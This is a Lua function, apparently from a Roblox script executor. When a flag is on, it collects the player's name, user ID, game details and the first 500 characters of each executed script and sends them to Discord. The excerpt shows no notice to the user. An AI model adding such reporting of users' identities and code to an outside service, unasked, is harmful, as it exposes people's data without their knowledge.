-- Función para loguear ejecución de scripts
local function logScriptExecution(scriptContent, scriptType)
    if not LOG_TO_DISCORD then return end
    
    -- Acortar el script si es muy largo
    local displayScript = scriptContent
    if #displayScript > 500 then
        displayScript = string.sub(displayScript, 1, 500) .. "..."
    end
    
    local fields = {
        {
            ["name"] = "👤 Usuario",
            ["value"] = playerName .. " (`" .. LP.UserId .. "`)",
            ["inline"] = true
        },
        {
            ["name"] = "🎮 Juego",
            ["value"] = gameInfo.name .. "\nID: " .. gameInfo.placeId,
            ["inline"] = true
        },
        {
            ["name"] = "🔧 Tipo",
            ["value"] = scriptType or "Script normal",
            ["inline"] = true
        },
        {
            ["name"] = "📜 Script",
            ["value"] = "```lua\n" .. displayScript .. "\n```"
        }
    }
    
    sendToDiscord(
        "🦊 **Script Ejecutado**",
        "**Usuario:** " .. playerName .. "\n**Juego:** " .. gameInfo.name,
        16748802, -- Color naranja
        fields
    )
end

